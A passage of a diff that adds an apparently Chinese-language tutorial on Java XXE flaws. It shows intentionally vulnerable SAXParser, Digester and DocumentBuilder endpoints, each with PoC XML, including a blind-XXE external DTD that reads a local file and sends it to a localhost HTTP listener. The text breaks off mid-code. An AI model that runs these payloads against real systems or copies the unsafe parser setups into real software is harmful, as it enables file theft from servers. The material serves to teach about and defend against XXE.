+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">com</span><span class="p">.</span><span class="nx">sun</span><span class="p">.</span><span class="nx">org</span><span class="p">.</span><span class="nx">apache</span><span class="p">.</span><span class="nx">xml</span><span class="p">.</span><span class="nx">internal</span><span class="p">.</span><span class="nx">resolver</span><span class="p">.</span><span class="nx">readers</span><span class="p">.</span><span class="nx">SAXParserHandler</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">org</span><span class="p">.</span><span class="nx">springframework</span><span class="p">.</span><span class="nx">web</span><span class="p">.</span><span class="nx">bind</span><span class="p">.</span><span class="nx">annotation</span><span class="p">.</span><span class="nx">RequestMapping</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">org</span><span class="p">.</span><span class="nx">springframework</span><span class="p">.</span><span class="nx">web</span><span class="p">.</span><span class="nx">bind</span><span class="p">.</span><span class="nx">annotation</span><span class="p">.</span><span class="nx">RestController</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">org</span><span class="p">.</span><span class="nx">xml</span><span class="p">.</span><span class="nx">sax</span><span class="p">.</span><span class="nx">InputSource</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">javax</span><span class="p">.</span><span class="nx">servlet</span><span class="p">.</span><span class="nx">http</span><span class="p">.</span><span class="nx">HttpServletRequest</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">javax</span><span class="p">.</span><span class="nx">xml</span><span class="p">.</span><span class="nx">parsers</span><span class="p">.</span><span class="nx">SAXParser</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">javax</span><span class="p">.</span><span class="nx">xml</span><span class="p">.</span><span class="nx">parsers</span><span class="p">.</span><span class="nx">SAXParserFactory</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">io</span><span class="p">.</span><span class="nx">IOException</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">io</span><span class="p">.</span><span class="nx">InputStream</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">io</span><span class="p">.</span><span class="nx">StringReader</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">/**
+</span></span></span><span class="line"><span class="cl"><span class="cm"> * 编号7089
+</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
+</span></span><span class="line"><span class="cl"><span class="err">@</span><span class="nx">RestController</span>
+</span></span><span class="line"><span class="cl"><span class="nx">public</span> <span class="nx">class</span> <span class="nx">SAXTest</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="err">@</span><span class="nf">RequestMapping</span><span class="p">(</span><span class="s">&#34;/saxdemo/vul&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">public</span> <span class="nx">String</span> <span class="nf">saxDemo</span><span class="p">(</span><span class="nx">HttpServletRequest</span> <span class="nx">request</span><span class="p">)</span> <span class="nx">throws</span> <span class="nx">IOException</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">//获取输入流
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">InputStream</span> <span class="nx">in</span> <span class="p">=</span> <span class="nx">request</span><span class="p">.</span><span class="nf">getInputStream</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">String</span> <span class="nx">body</span> <span class="p">=</span>  <span class="nf">convertStreamToString</span><span class="p">(</span><span class="nx">in</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">SAXParserFactory</span> <span class="nx">spf</span> <span class="p">=</span> <span class="nx">SAXParserFactory</span><span class="p">.</span><span class="nf">newInstance</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">SAXParser</span> <span class="nx">parser</span> <span class="p">=</span> <span class="nx">spf</span><span class="p">.</span><span class="nf">newSAXParser</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">SAXParserHandler</span> <span class="nx">handler</span> <span class="p">=</span> <span class="nx">new</span> <span class="nf">SAXParserHandler</span><span class="p">();</span>   <span class="c1">//关键字
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="c1">//解析xml
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nx">parser</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="nx">new</span> <span class="nf">InputSource</span><span class="p">(</span><span class="nx">new</span> <span class="nf">StringReader</span><span class="p">(</span><span class="nx">body</span><span class="p">)),</span> <span class="nx">handler</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s">&#34;Sax xxe vuln code&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="nf">catch</span> <span class="p">(</span><span class="nx">Exception</span> <span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s">&#34;Error......&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">public</span> <span class="nx">static</span> <span class="nx">String</span> <span class="nf">convertStreamToString</span><span class="p">(</span><span class="nx">java</span><span class="p">.</span><span class="nx">io</span><span class="p">.</span><span class="nx">InputStream</span> <span class="nx">is</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">java</span><span class="p">.</span><span class="nx">util</span><span class="p">.</span><span class="nx">Scanner</span> <span class="nx">s</span> <span class="p">=</span> <span class="nx">new</span> <span class="nx">java</span><span class="p">.</span><span class="nx">util</span><span class="p">.</span><span class="nf">Scanner</span><span class="p">(</span><span class="nx">is</span><span class="p">).</span><span class="nf">useDelimiter</span><span class="p">(</span><span class="s">&#34;\\A&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">s</span><span class="p">.</span><span class="nf">hasNext</span><span class="p">()</span> <span class="err">?</span> <span class="nx">s</span><span class="p">.</span><span class="nf">next</span><span class="p">()</span> <span class="p">:</span> <span class="s">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Poc:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE data [
+</span></span></span><span class="line"><span class="cl"><span class="cp">        &lt;!ENTITY % remote SYSTEM &#34;http://127.0.0.1:8080/bypass.dtd&#34;&gt;</span>
+</span></span><span class="line"><span class="cl">        %remote;
+</span></span><span class="line"><span class="cl">        ]&gt;
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;message&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;to&gt;</span>Kobe<span class="nt">&lt;/to&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;from&gt;</span>James<span class="nt">&lt;/from&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;text&gt;</span><span class="ni">&amp;internal;</span><span class="nt">&lt;/text&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/message&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY % file SYSTEM &#34;file:///e://1.txt&#34;&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY % all &#34;&lt;!ENTITY send SYSTEM &#39;http://127.0.0.1:8080/?%file;&#39;&gt;</span>&#34;&gt;
+</span></span><span class="line"><span class="cl">%all;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="5digester">5.Digester</h4>
+<p>其触发的xxe漏洞是没有回显的，我们一般需要通过Blind XXE的方法来利用</p>
+<p>引入依赖：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;groupId&gt;</span>commons-digester<span class="nt">&lt;/groupId&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;artifactId&gt;</span>commons-digester<span class="nt">&lt;/artifactId&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;version&gt;</span>2.1<span class="nt">&lt;/version&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependency&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.example.xxedemo</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.digester.Digester</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.dom4j.io.SAXReader</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.bind.annotation.RequestMapping</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.bind.annotation.RestController</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.xml.sax.InputSource</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.http.HttpServletRequest</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.InputStream</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.StringReader</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nd">@RestController</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">DigesterTest</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@RequestMapping</span><span class="p">(</span><span class="s">&#34;/digesterdemo/vul&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">digesterDemo</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">//获取输入流</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">InputStream</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">body</span><span class="w"> </span><span class="o">=</span><span class="w">  </span><span class="n">convertStreamToString</span><span class="p">(</span><span class="n">in</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Digester</span><span class="w"> </span><span class="n">digester</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Digester</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">digester</span><span class="p">.</span><span class="na">parse</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">StringReader</span><span class="p">(</span><span class="n">body</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="s">&#34;Digester XXE......&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="s">&#34;EXCEPT ERROR!!!&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">convertStreamToString</span><span class="p">(</span><span class="n">java</span><span class="p">.</span><span class="na">io</span><span class="p">.</span><span class="na">InputStream</span><span class="w"> </span><span class="n">is</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">java</span><span class="p">.</span><span class="na">util</span><span class="p">.</span><span class="na">Scanner</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="na">util</span><span class="p">.</span><span class="na">Scanner</span><span class="p">(</span><span class="n">is</span><span class="p">).</span><span class="na">useDelimiter</span><span class="p">(</span><span class="s">&#34;\\A&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">hasNext</span><span class="p">()</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">next</span><span class="p">()</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="6documentbuiderfactory">6.DocumentBuiderFactory</h4>
+<p>这是JDK自带的类，以此产生的XXE是存在回显的</p>
+<p>DocumentBuilder是Java中常用的XML文档解析工具，是基于 DOM（文档对象模型）的解析方式，把整个XML文档加载到内存并转化成DOM树，因此应用程序可以随机访问DOM树的任何数据。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.parsers.DocumentBuilder</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.parsers.DocumentBuilderFactory</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.w3c.dom.Document</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.w3c.dom.Element</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.w3c.dom.NodeList</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.File</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">dbuilder</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">File</span><span class="w"> </span><span class="n">file</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">File</span><span class="p">(</span><span class="s">&#34;test.xml&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//DocumentBuilderFactory是一个抽象工厂类，不能直接实例化</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">DocumentBuilderFactory</span><span class="w"> </span><span class="n">factory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DocumentBuilderFactory</span><span class="p">.</span><span class="na">newInstance</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">//获取Dom模式解析对象</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">DocumentBuilder</span><span class="w"> </span><span class="n">builder</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">factory</span><span class="p">.</span><span class="na">newDocumentBuilder</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">//读取xml文件</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Document</span><span class="w"> </span><span class="n">document</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">builder</span><span class="p">.</span><span class="na">parse</span><span class="p">(</span><span class="n">file</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">//获取名为 message 节点</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">NodeList</span><span class="w"> </span><span class="n">nodeList</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">document</span><span class="p">.</span><span class="na">getElementsByTagName</span><span class="p">(</span><span class="s">&#34;message&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Element</span><span class="w"> </span><span class="n">e</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Element</span><span class="p">)</span><span class="w"> </span><span class="n">nodeList</span><span class="p">.</span><span class="na">item</span><span class="p">(</span><span class="n">0</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">//根据节点名称获取值</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;To: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">e</span><span class="p">.</span><span class="na">getElementsByTagName</span><span class="p">(</span><span class="s">&#34;to&#34;</span><span class="p">).</span><span class="na">item</span><span class="p">(</span><span class="n">0</span><span class="p">).</span><span class="na">getFirstChild</span><span class="p">().</span><span class="na">getNodeValue</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;From: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">e</span><span class="p">.</span><span class="na">getElementsByTagName</span><span class="p">(</span><span class="s">&#34;from&#34;</span><span class="p">).</span><span class="na">item</span><span class="p">(</span><span class="n">0</span><span class="p">).</span><span class="na">getFirstChild</span><span class="p">().</span><span class="na">getNodeValue</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;Text: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">e</span><span class="p">.</span><span class="na">getElementsByTagName</span><span class="p">(</span><span class="s">&#34;text&#34;</span><span class="p">).</span><span class="na">item</span><span class="p">(</span><span class="n">0</span><span class="p">).</span><span class="na">getFirstChild</span><span class="p">().</span><span class="na">getNodeValue</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>测试poc：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; ?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE foo SYSTEM &#34;http://127.0.0.1:8080/xxe.dtd&#34; &gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;message&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;to&gt;</span>Kobe<span class="nt">&lt;/to&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;from&gt;</span>James<span class="nt">&lt;/from&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;text&gt;</span><span class="ni">&amp;tmp;</span><span class="nt">&lt;/text&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/message&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>外部DTD:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY tmp SYSTEM &#34;file:///e://1.txt&#34;&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="7saxtransformer">7.SAXTransformer</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.transform.sax.SAXTransformerFactory</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.transform.stream.StreamSource</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.File</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileInputStream</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.InputStream</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">SAXTransformer</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
